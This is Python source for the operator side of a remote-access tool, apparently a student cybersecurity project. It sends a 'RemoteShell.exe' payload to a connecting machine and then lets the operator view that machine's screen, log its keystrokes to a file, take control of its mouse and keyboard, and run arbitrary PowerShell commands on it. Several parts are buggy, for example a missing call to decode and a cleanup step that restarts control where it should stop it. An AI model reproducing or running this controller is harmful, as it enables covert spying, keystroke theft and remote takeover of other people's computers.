import socket
from datetime import datetime
from share_screens import ScreenSharingServer
from remote_control import ServerRemoteControl
import threading


def send_file(file_path, host, port):
    # Open the file in binary mode
    with open(file_path, 'rb') as f:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Bind the socket to the host and port
        s.bind((host, port))
        # Listen for incoming connections
        s.listen(1)
        print(f"Server listening on {host}:{port}")
        # Accept a connection
        conn, addr = s.accept()
        message = conn.recv(1024).decode
        if message == 'stop':
            conn.close()
            s.close()
            print('File already installed')
        else:
            while True:
                chunk = f.read(1024)
                if not chunk:
                    break
                conn.sendall(chunk)
                print("check")
            # Close the socket
            conn.close()
            s.close()
            print("File sent")


def copy_and_clear_file(file_path):
    try:
        # Read the contents of the file
        file = open(file_path, 'rb')
        file_data = file.read()
        file.close()

        # Clear the contents of the file
        file = open(file_path, 'w')
        file.write('')
        file.close()

        return file_data
    except Exception as e:
        return f"Error: {e}"


def save_to_file(data):
    current_datetime = datetime.now().strftime("%d/%m/%Y %H:%M:%S.%f")
    with open("log.txt", "a") as f:
        f.write(f"Current date and time: {current_datetime}\n")
        f.write(data + "\n\n")


def start_server():
    host = '127.0.0.1'
    port = 12345
    file_path = 'C:/CyberClass/Project/RemoteShell.exe'
    send_file(file_path, host, 54321)
    screen_sharing_server = ScreenSharingServer((host, 9999))
    server_remote_mouse_control = ServerRemoteControl((host, 9898))
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"Server listening on {host}:{port}")
    # Accept a connection from a client
    client_socket, client_address = server_socket.accept()
    print(f"Connection established with {client_address}")
    try:
        # Receive input from the user and send it to the client
        while True:
            user_input = input("Enter a command to send to the client (type help for assistance): ")
            if user_input.lower() == 'help':
                print('help - shows this menu \n')
                print('exit - closes program \n')
                print("share - will share the screen of the other computer \n")
                print("stop sharing - will stop the screen share \n")
                print("record - will record the keyboard input of the other computer \n")
                print('stop recording - will stop the recording of the keyboard of the other computer \n')
                print("control - you will be able to take control over the mouse & keyboard of the other computer \n")
                print("stop controlling - will stop the control over the mouse & keyboard of the other computer \n")
                print('If you type something else it will execute it as a command in the PowerShell process of the '
                      'other computer.')
                continue
            if user_input.lower() == 'exit':
                break
            if user_input.lower() == 'stop recording':
                client_socket.send(user_input.encode())
                keyboard_input = client_socket.recv(2048).decode()
                save_to_file(keyboard_input)
                print(client_socket.recv(1024).decode())
                continue
            if user_input.lower() == 'share':
                share_screen_thread = threading.Thread(target=screen_sharing_server.start_sharing())
                share_screen_thread.start()
                client_socket.send(user_input.encode())
                print(client_socket.recv(4096).decode())
                continue
            if user_input.lower() == 'stop sharing':
                screen_sharing_server.stop_sharing()
            if user_input.lower() == 'control':
                control_thread = threading.Thread(target=server_remote_mouse_control.start_controlling)
                control_thread.start()
            if user_input.lower() == 'stop controlling':
                server_remote_mouse_control.stop_controlling()
            # Send the user input to the client
            client_socket.send(user_input.encode())
            print(client_socket.recv(4096).decode())

    except KeyboardInterrupt:
        pass
    finally:
        client_socket.close()
        server_socket.close()
        if screen_sharing_server.active_sharing:
            screen_sharing_server.stop_sharing()
        if server_remote_mouse_control.active_sharing:
            server_remote_mouse_control.start_controlling()
        print("Server closed")


if __name__ == "__main__":
    start_server()
